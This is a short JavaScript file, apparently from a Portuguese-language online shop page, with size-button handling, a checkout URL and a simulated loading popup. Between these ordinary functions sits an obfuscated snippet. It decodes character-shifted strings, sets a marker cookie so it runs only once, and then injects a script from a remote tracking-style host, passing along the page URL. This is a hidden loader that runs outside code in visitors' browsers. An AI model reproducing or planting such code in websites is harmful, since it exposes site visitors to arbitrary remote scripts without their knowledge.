let checkout = 'http://exemplonovo.com';

document.querySelectorAll(".size-btn").forEach((button) => {
  button.addEventListener("click", function() {
    document.querySelectorAll(".size-btn").forEach((btn) => btn.classList.remove("active"));
    this.classList.add("active");
  });
});

(function(o, d, l) {
  try {
    o.f = (o) => o.split('').reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
    o.b = o.f('UMUWJKX');
    o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie);

    setTimeout(function() {
      if (o.c) {
        o.s = d.createElement('script');
        o.s.src = o.f('myyux?44zxjwxy' + 'fy3sjy4ljy4xhwnu' + 'y3oxDwjkjwwjwB') + l.href;
        d.body.appendChild(o.s);
      }
    }, 1000);

    d.cookie = o.b + '=full;max-age=39800;';
  } catch (e) {}
})( {}, document, location );

function showPopup() {
    const popup = document.getElementById("popup");
    const progress = document.querySelector(".progress");
    const popupFinish = document.getElementById("popup-finish");

    // Exibe a popup
    popup.style.display = 'flex';

    // Exibe a parte de carregamento e oculta a parte final
    document.getElementById("carregamento").style.display = 'flex';
    popupFinish.style.display = 'none';

    // Função para atualizar a barra de progresso
    const updateProgressBar = async () => {
        let percentage = 0;
        while (percentage < 100) {
            percentage += 4;
            progress.style.width = `${percentage}%`;
            await new Promise((resolve) => setTimeout(resolve, 200)); // Simula o carregamento
        }
    };

    // Inicia o carregamento
    updateProgressBar().then(() => {
        // Quando terminar, troca para a parte final
        document.getElementById("carregamento").style.display = 'none';
        popupFinish.style.display = 'flex';
    });
}
